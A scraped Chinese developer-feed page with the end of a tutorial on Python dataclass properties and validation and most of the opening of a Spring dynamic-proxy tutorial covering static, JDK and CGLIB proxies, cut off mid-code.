    <span class="hljs-keyword">def</span> <span class="hljs-title function_">age</span>(<span class="hljs-params">self, value: <span class="hljs-built_in">int</span></span>):
        <span class="hljs-string">"""Setter：确保年龄合法"""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(value, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">or</span> value &lt; <span class="hljs-number">0</span>:
            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"年龄必须是非负整数"</span>)
        self._age = value

<span class="hljs-comment"># 使用示例</span>
p = Person(<span class="hljs-string">"alice"</span>, <span class="hljs-number">25</span>)
<span class="hljs-built_in">print</span>(p.name)  <span class="hljs-comment"># 输出: ALICE</span>
<span class="hljs-built_in">print</span>(p.age)   <span class="hljs-comment"># 输出: 25</span>

p.name = <span class="hljs-string">"bob"</span>
p.age = <span class="hljs-number">30</span>
<span class="hljs-built_in">print</span>(p.name)  <span class="hljs-comment"># 输出: BOB</span>

<span class="hljs-comment"># 尝试非法赋值</span>
<span class="hljs-comment"># p.age = -5  # 抛出 ValueError</span>
</code></pre>
<blockquote>
<p>注意：由于我们使用了 <code>_name</code> 和 <code>_age</code> 作为 dataclass 字段，它们仍然会出现在 <code>__init__</code> 中。这意味着用户在创建对象时仍需传入这些“私有”字段。这是 dataclass 的特性，也是合理的——初始化时的数据应由调用者负责合法性。</p>
</blockquote>
<hr/>
<h3 data-id="heading-5">4. 只读属性：只有 getter，没有 setter</h3>
<p>如果你希望某个字段在初始化后不可修改，可以只定义 <code>@property</code> 而不提供 setter：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass

<span class="hljs-meta">@dataclass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:
    _<span class="hljs-built_in">id</span>: <span class="hljs-built_in">str</span>
    name: <span class="hljs-built_in">str</span>

<span class="hljs-meta">    @property</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">id</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:
        <span class="hljs-keyword">return</span> self._<span class="hljs-built_in">id</span>

<span class="hljs-comment"># 使用</span>
u = User(<span class="hljs-string">"12345"</span>, <span class="hljs-string">"Charlie"</span>)
<span class="hljs-built_in">print</span>(u.<span class="hljs-built_in">id</span>)      <span class="hljs-comment"># 正常读取</span>
<span class="hljs-comment"># u.id = "67890" # 报错: AttributeError: can't set attribute</span>
</code></pre>
<p>这样就实现了真正的只读属性。</p>
<hr/>
<h3 data-id="heading-6">5. 初始化后处理：<code>__post_init__</code></h3>
<p>有时你只想在对象创建后做一次校验或转换，而不需要每次访问都控制。这时可以用 <code>__post_init__</code>：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass

<span class="hljs-meta">@dataclasses.dataclass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span>:
    name: <span class="hljs-built_in">str</span>
    price: <span class="hljs-built_in">float</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__post_init__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">if</span> self.price &lt; <span class="hljs-number">0</span>:
            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"价格不能为负数"</span>)

<span class="hljs-comment"># 使用</span>
p = Product(<span class="hljs-string">"Laptop"</span>, <span class="hljs-number">999.99</span>)  <span class="hljs-comment"># 正常</span>
<span class="hljs-comment"># p = Product("Phone", -100)   # 抛出异常</span>
</code></pre>
<p>这种方式适合一次性校验，但无法防止后续对 <code>price</code> 的非法赋值。如果需要持续保护，还是得用 <code>@property</code>。</p>
<hr/>
<h3 data-id="heading-7">6. 最佳实践建议</h3>





























<table><thead><tr><th>场景</th><th>推荐做法</th></tr></thead><tbody><tr><td>普通数据存储</td><td>直接使用 dataclass 字段，无需 getter/setter</td></tr><tr><td>需要验证或转换</td><td>使用 <code>@property</code> + 私有字段</td></tr><tr><td>只读属性</td><td>仅定义 <code>@property</code>，不提供 setter</td></tr><tr><td>初始化校验</td><td>使用 <code>__post_init__</code></td></tr><tr><td>避免</td><td>手动编写 <code>get_name()</code> / <code>set_name()</code> 方法（违背 Python 风格）</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-8">结语</h3>
<p>Python 的 <code>dataclass</code> 并不自动生成传统的 getter 和 setter，但这恰恰体现了 Python “显式优于隐式”、“简单优于复杂”的设计哲学。大多数情况下，直接访问属性就足够了；当需要额外逻辑时，<code>@property</code> 提供了强大而优雅的解决方案。<strong>毕竟我们都是成年人”（<em>We’re all consenting adults here</em>）</strong></p>
<p>记住：<strong>不要为了封装而封装</strong>。只有在真正需要控制属性访问行为时，才引入 getter/setter。</p>
<hr/>
<p><strong>参考文档</strong>：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fpeps.python.org%2Fpep-0557%2F" target="_blank" title="https://peps.python.org/pep-0557/" ref="nofollow noopener noreferrer">PEP 557 – Data Classes</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.python.org%2F3%2Flibrary%2Ffunctions.html%23property" target="_blank" title="https://docs.python.org/3/library/functions.html#property" ref="nofollow noopener noreferrer">Python Property Documentation</a></li>
</ul>
<p>如果你有更复杂的属性管理需求（比如动态计算字段、依赖注入等），也可以考虑结合 <code>pydantic</code> 或 <code>attrs</code> 等第三方库。但对大多数场景来说，<code>dataclass + property</code> 已经足够强大且清晰。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring动态代理详解]]></title>    <link>https://juejin.cn/post/7575438636332449843</link>    <guid>https://juejin.cn/post/7575438636332449843</guid>    <pubDate>2025-11-24T02:35:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575438636332449843" data-draft-id="7575367791274229798" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring动态代理详解"/> <meta itemprop="keywords" content="Spring,Java"/> <meta itemprop="datePublished" content="2025-11-24T02:35:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="雨中飘荡的记忆"/> <meta itemprop="url" content="https://juejin.cn/user/694547077666606"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring动态代理详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/694547077666606/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    雨中飘荡的记忆
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T02:35:47.000Z" title="Mon Nov 24 2025 02:35:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读13分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Spring动态代理详解：从原理到实战</h2>
<h3 data-id="heading-1">前言</h3>
<p>动态代理是Spring框架实现AOP、事务管理、声明式缓存等核心功能的基石。理解动态代理的原理和使用方式，对于深入掌握Spring框架至关重要。本文将从代理模式的基本概念出发，详细讲解JDK动态代理和CGLIB代理的实现原理，以及Spring如何选择和使用这两种代理方式。</p>
<h3 data-id="heading-2">一、代理模式概述</h3>
<h4 data-id="heading-3">1.1 什么是代理模式</h4>
<p>代理模式是一种结构型设计模式，它为目标对象提供一个代理对象，由代理对象控制对目标对象的访问。</p>
<pre><code class="hljs language-arduino" lang="arduino">代理模式结构
┌─────────────────────────────────────────┐
│  <span class="hljs-built_in">Client</span>（客户端）                        │
│     │                                    │
│     ▼                                    │
│  ┌───────────┐                          │
│  │   Proxy   │ ← 代理对象                │
│  └─────┬─────┘                          │
│        │                                 │
│   代理逻辑：                             │
│   - 前置处理（日志、权限等）             │
│   - 调用目标方法                         │
│   - 后置处理（结果处理等）               │
│        │                                 │
│        ▼                                 │
│  ┌───────────┐                          │
│  │  Target   │ ← 目标对象                │
│  └───────────┘                          │
└─────────────────────────────────────────┘
</code></pre>
<h4 data-id="heading-4">1.2 静态代理</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * 接口
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> {
    User <span class="hljs-title function_">findById</span><span class="hljs-params">(Long id)</span>;
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">(User user)</span>;
}

<span class="hljs-comment">/**
 * 目标类
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">findById</span><span class="hljs-params">(Long id)</span> {
        System.out.println(<span class="hljs-string">"查询用户: "</span> + id);
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(id, <span class="hljs-string">"User"</span> + id);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">(User user)</span> {
        System.out.println(<span class="hljs-string">"保存用户: "</span> + user.getUsername());
    }
}

<span class="hljs-comment">/**
 * 静态代理类
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> {

    <span class="hljs-keyword">private</span> UserService target;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserServiceProxy</span><span class="hljs-params">(UserService target)</span> {
        <span class="hljs-built_in">this</span>.target = target;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">findById</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-comment">// 前置增强</span>
        System.out.println(<span class="hljs-string">"[静态代理] 方法开始: findById"</span>);
        <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();

        <span class="hljs-comment">// 调用目标方法</span>
        <span class="hljs-type">User</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> target.findById(id);

        <span class="hljs-comment">// 后置增强</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">endTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        System.out.println(<span class="hljs-string">"[静态代理] 方法结束，耗时: "</span> + (endTime - startTime) + <span class="hljs-string">"ms"</span>);

        <span class="hljs-keyword">return</span> result;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">(User user)</span> {
        System.out.println(<span class="hljs-string">"[静态代理] 方法开始: save"</span>);
        target.save(user);
        System.out.println(<span class="hljs-string">"[静态代理] 方法结束"</span>);
    }
}

<span class="hljs-comment">/**
 * 使用静态代理
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticProxyDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 创建目标对象</span>
        <span class="hljs-type">UserService</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();

        <span class="hljs-comment">// 创建代理对象</span>
        <span class="hljs-type">UserService</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceProxy</span>(target);

        <span class="hljs-comment">// 通过代理调用</span>
        proxy.findById(<span class="hljs-number">1L</span>);
        proxy.save(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-literal">null</span>, <span class="hljs-string">"张三"</span>));
    }
}
</code></pre>
<p><strong>静态代理的问题：</strong></p>
<ul>
<li>每个目标类都需要一个代理类</li>
<li>接口增加方法，代理类也要修改</li>
<li>代码重复，维护困难</li>
</ul>
<h4 data-id="heading-5">1.3 动态代理</h4>
<p>动态代理在运行时动态创建代理类，无需手动编写代理类代码。</p>
<pre><code class="hljs">静态代理 vs 动态代理
┌─────────────────────┬──────────────────────┐
│  静态代理            │  动态代理             │
├─────────────────────┼──────────────────────┤
│  编译时创建代理类    │  运行时创建代理类      │
│  手动编写代理类      │  自动生成代理类        │
│  每个类一个代理      │  一套代理逻辑复用      │
│  维护困难            │  灵活易扩展           │
└─────────────────────┴──────────────────────┘
</code></pre>
<h3 data-id="heading-6">二、JDK动态代理</h3>
<h4 data-id="heading-7">2.1 JDK动态代理原理</h4>
<p>JDK动态代理基于接口实现，通过<code>java.lang.reflect.Proxy</code>类和<code>InvocationHandler</code>接口来创建代理对象。</p>
<pre><code class="hljs language-scss" lang="scss">JDK动态代理原理
┌─────────────────────────────────────────┐
│  <span class="hljs-number">1</span>. 运行时生成代理类（<span class="hljs-variable">$Proxy0</span>）          │
│  <span class="hljs-number">2</span>. 代理类实现目标接口                   │
│  <span class="hljs-number">3</span>. 代理类持有InvocationHandler引用      │
│  <span class="hljs-number">4</span>. 调用代理方法时，转发给InvocationHandler
│  <span class="hljs-number">5</span>. InvocationHandler中调用目标方法      │
└─────────────────────────────────────────┘

      ┌───────────────┐
      │  Interface    │
      └───────┬───────┘
              │
     ┌────────┴────────┐
     │                 │
┌────┴────┐      ┌─────┴─────┐
│<span class="hljs-variable">$Proxy0</span>  │      │  Target   │
│(代理类) │      │ (目标类)  │
└────┬────┘      └───────────┘
     │
     ▼
┌─────────────────┐
│InvocationHandler│
│ (调用处理器)     │
└─────────────────┘
</code></pre>
<h4 data-id="heading-8">2.2 JDK动态代理实现</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * 自定义InvocationHandler
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> {

    <span class="hljs-keyword">private</span> Object target;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">LogInvocationHandler</span><span class="hljs-params">(Object target)</span> {
        <span class="hljs-built_in">this</span>.target = target;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable {
        <span class="hljs-comment">// 获取方法信息</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> method.getName();
        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> target.getClass().getSimpleName();

        <span class="hljs-comment">// 前置增强</span>
        System.out.println(<span class="hljs-string">"[JDK代理] "</span> + className + <span class="hljs-string">"."</span> + methodName + <span class="hljs-string">"() 开始执行"</span>);
        System.out.println(<span class="hljs-string">"[JDK代理] 参数: "</span> + Arrays.toString(args));
        <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();

        Object result;
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 调用目标方法</span>
            result = method.invoke(target, args);

            <span class="hljs-comment">// 后置增强</span>
            <span class="hljs-type">long</span> <span class="hljs-variable">endTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
            System.out.println(<span class="hljs-string">"[JDK代理] 返回值: "</span> + result);
            System.out.println(<span class="hljs-string">"[JDK代理] 执行成功，耗时: "</span> + (endTime - startTime) + <span class="hljs-string">"ms"</span>);

        } <span class="hljs-keyword">catch</span> (InvocationTargetException e) {
            <span class="hljs-comment">// 异常增强</span>
            System.out.println(<span class="hljs-string">"[JDK代理] 执行异常: "</span> + e.getTargetException().getMessage());
            <span class="hljs-keyword">throw</span> e.getTargetException();
        }

        <span class="hljs-keyword">return</span> result;
    }
}

<span class="hljs-comment">/**
 * JDK动态代理工厂
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdkProxyFactory</span> {

    <span class="hljs-comment">/**
     * 创建代理对象
     */</span>
    <span class="hljs-meta">@SuppressWarnings("unchecked")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">createProxy</span><span class="hljs-params">(T target)</span> {
        <span class="hljs-keyword">return</span> (T) Proxy.newProxyInstance(
            target.getClass().getClassLoader(),    <span class="hljs-comment">// 类加载器</span>
            target.getClass().getInterfaces(),     <span class="hljs-comment">// 目标类实现的接口</span>
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogInvocationHandler</span>(target)       <span class="hljs-comment">// 调用处理器</span>
        );
    }
}

<span class="hljs-comment">/**
 * 使用JDK动态代理
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdkProxyDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 创建目标对象</span>
        <span class="hljs-type">UserService</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();

        <span class="hljs-comment">// 创建代理对象</span>
        <span class="hljs-type">UserService</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> JdkProxyFactory.createProxy(target);

        <span class="hljs-comment">// 通过代理调用</span>
        proxy.findById(<span class="hljs-number">1L</span>);
        System.out.println(<span class="hljs-string">"---"</span>);
        proxy.save(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-literal">null</span>, <span class="hljs-string">"李四"</span>));

        <span class="hljs-comment">// 打印代理类信息</span>
        System.out.println(<span class="hljs-string">"代理类: "</span> + proxy.getClass().getName());
        System.out.println(<span class="hljs-string">"代理类实现的接口: "</span> + Arrays.toString(proxy.getClass().getInterfaces()));
    }
}
</code></pre>
<h4 data-id="heading-9">2.3 生成的代理类分析</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * JDK动态生成的代理类（反编译）
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">$Proxy0</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Proxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Method m1;  <span class="hljs-comment">// equals</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Method m2;  <span class="hljs-comment">// toString</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Method m3;  <span class="hljs-comment">// findById</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Method m4;  <span class="hljs-comment">// save</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Method m0;  <span class="hljs-comment">// hashCode</span>

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            m3 = Class.forName(<span class="hljs-string">"com.example.UserService"</span>)
                .getMethod(<span class="hljs-string">"findById"</span>, Long.class);
            m4 = Class.forName(<span class="hljs-string">"com.example.UserService"</span>)
                .getMethod(<span class="hljs-string">"save"</span>, User.class);
            <span class="hljs-comment">// ...</span>
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoSuchMethodError</span>(e.getMessage());
        }
    }

    <span class="hljs-keyword">public</span> $Proxy0(InvocationHandler h) {
        <span class="hljs-built_in">super</span>(h);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">findById</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 调用InvocationHandler的invoke方法</span>
            <span class="hljs-keyword">return</span> (User) <span class="hljs-built_in">super</span>.h.invoke(<span class="hljs-built_in">this</span>, m3, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{id});
        } <span class="hljs-keyword">catch</span> (Throwable e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndeclaredThrowableException</span>(e);
        }
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">(User user)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-built_in">super</span>.h.invoke(<span class="hljs-built_in">this</span>, m4, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{user});
        } <span class="hljs-keyword">catch</span> (Throwable e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndeclaredThrowableException</span>(e);
        }
    }
}
</code></pre>
<h4 data-id="heading-10">2.4 JDK代理的限制</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * JDK动态代理的限制
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdkProxyLimitation</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// ❌ 错误：目标类没有实现接口</span>
        <span class="hljs-type">OrderService</span> <span class="hljs-variable">orderService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderService</span>();

        <span class="hljs-comment">// 以下代码会抛出异常</span>
        <span class="hljs-comment">// OrderService proxy = JdkProxyFactory.createProxy(orderService);</span>
        <span class="hljs-comment">// 因为OrderService没有实现任何接口</span>

        System.out.println(<span class="hljs-string">"JDK动态代理要求目标类必须实现接口"</span>);
    }
}

<span class="hljs-comment">/**
 * 没有实现接口的类
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"创建订单"</span>);
    }
}
</code></pre>
<h3 data-id="heading-11">三、CGLIB动态代理</h3>
<h4 data-id="heading-12">3.1 CGLIB代理原理</h4>
<p>CGLIB（Code Generation Library）通过继承目标类的方式创建代理，不需要目标类实现接口。</p>
<pre><code class="hljs language-php" lang="php">CGLIB代理原理
┌─────────────────────────────────────────┐
│  <span class="hljs-number">1</span>. 运行时生成代理类（继承目标类）       │
│  <span class="hljs-number">2</span>. 通过ASM字节码操作生成子类           │
│  <span class="hljs-number">3</span>. 代理类重写父类的非<span class="hljs-keyword">final</span>方法          │
│  <span class="hljs-number">4</span>. 方法调用时，通过MethodInterceptor拦截│
│  <span class="hljs-number">5</span>. MethodInterceptor中调用父类方法      │
└─────────────────────────────────────────┘

┌───────────────┐
│  Target       │
│  (目标类)     │
└───────┬───────┘
        │ <span class="hljs-keyword">extends</span>
        │
┌───────┴───────┐
│ Target<span class="hljs-variable">$$CGLIB</span> │
│  (代理类)     │
└───────┬───────┘
        │
        ▼
┌─────────────────┐
│MethodInterceptor│
│  (方法拦截器)    │
└─────────────────┘
</code></pre>
<h4 data-id="heading-13">3.2 CGLIB代理实现</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
